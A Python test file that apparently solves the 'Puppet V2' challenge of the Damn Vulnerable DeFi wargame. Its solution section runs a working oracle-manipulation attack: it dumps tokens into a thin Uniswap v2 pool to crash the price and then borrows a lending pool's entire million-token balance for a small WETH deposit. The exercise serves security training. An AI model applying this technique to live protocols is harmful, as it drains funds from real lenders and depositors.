from scripts.utils import *
from brownie import DamnValuableToken, WETH9, PuppetV2Pool

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################
    web3 = import_web3()

    # Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    UNISWAP_INITIAL_TOKEN_RESERVE = ether_to_wei(100)
    UNISWAP_INITIAL_WETH_RESERVE = ether_to_wei(10)
    # attacker balance
    ATTACKER_INITIAL_TOKEN_BALANCE = ether_to_wei(10000)
    # pool token balance
    POOL_INITIAL_TOKEN_BALANCE = ether_to_wei(1000000)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # set attacker balance to 20 ETH
    set_account_balance_network(attacker.address, hex(ether_to_wei(20)))
    # check attacker balance
    assert attacker.balance() == ether_to_wei(20)

    # get UniV2 contracts ABI and bytecode
    factoryABI, factoryBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Factory.json')
    routerABI, routerBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Router02.json')
    pairABI, pairBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Pair.json')

    # deploy tokens to be traded
    token = DamnValuableToken.deploy(_fromDeployer)
    weth = WETH9.deploy(_fromDeployer)

    # load UniV2 contracts
    uniswap_factory = load_contract_from_abi_and_bytecode('UniswapV2Factory', factoryABI, factoryBytecode, constructor_params=[(ZERO_ADDRESS, 'address')])
    uniswap_router = load_contract_from_abi_and_bytecode('UniswapV2Router', routerABI, routerBytecode, constructor_params=[(uniswap_factory.address, 'address'), (weth.address, 'address')])

    # approve spending limit for tokens for deployer
    token.approve(uniswap_router.address, UNISWAP_INITIAL_TOKEN_RESERVE, _fromDeployer)
    # Create Uniswap pair against WETH and add liquidity
    uniswap_router.addLiquidityETH(
        token.address,
        UNISWAP_INITIAL_TOKEN_RESERVE,                  # amountTokenDesired
        0,                                              # amountTokenMin
        0,                                              # amountETHMin
        deployer.address,                               # to
        web3.eth.get_block('latest')['timestamp'] * 2,  # deadline
        _fromDeployer | value_dict(UNISWAP_INITIAL_WETH_RESERVE)
    )

    # get pair just created
    uniswap_exchange = Contract.from_abi('UniswapV2Pair', uniswap_factory.getPair(token.address, weth.address), pairABI)
    assert uniswap_exchange.balanceOf(deployer.address) > 0

    # deploy the lending pool
    lending_pool = PuppetV2Pool.deploy(weth.address, token.address, uniswap_exchange.address, uniswap_factory.address, _fromDeployer)

    # Setup initial token balances of pool and attacker account
    token.transfer(lending_pool.address, POOL_INITIAL_TOKEN_BALANCE)
    token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE)

    # check that pool is correctly setup
    assert lending_pool.calculateDepositOfWETHRequired(ether_to_wei(1)) == ether_to_wei(0.3)
    assert lending_pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE) == ether_to_wei(300000)

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # Attacker has taken all tokens from the pool
        assert token.balanceOf(lending_pool.address) == 0
        assert token.balanceOf(attacker.address) >= POOL_INITIAL_TOKEN_BALANCE

# #########################################################
# The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!
#
# Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
#
# You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;) 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # approve spending limit at the uniswap router
    token.approve(uniswap_router.address, 2**256 - 1, _fromAttacker)
    
    # exchange the tokens for ETH
    uniswap_router.swapExactTokensForETH(
        ether_to_wei(10000), 
        9.92, 
        [token.address, weth.address],
        attacker.address,
        web3.eth.get_block('latest').timestamp * 2,
        _fromAttacker)
    
    # obtain amount of WETH required to borrow the entire balance
    amount = lending_pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)

    # deposit ETH to obtain the required WETH
    weth.deposit(_fromAttacker | value_dict(amount))
    
    # approve the lending pool removing `amount` of tokens from the attacker account 
    weth.approve(lending_pool.address, amount, _fromAttacker)
    
    # borrow the entire token balance
    lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, _fromAttacker)
    
    ######################
    check_solution()
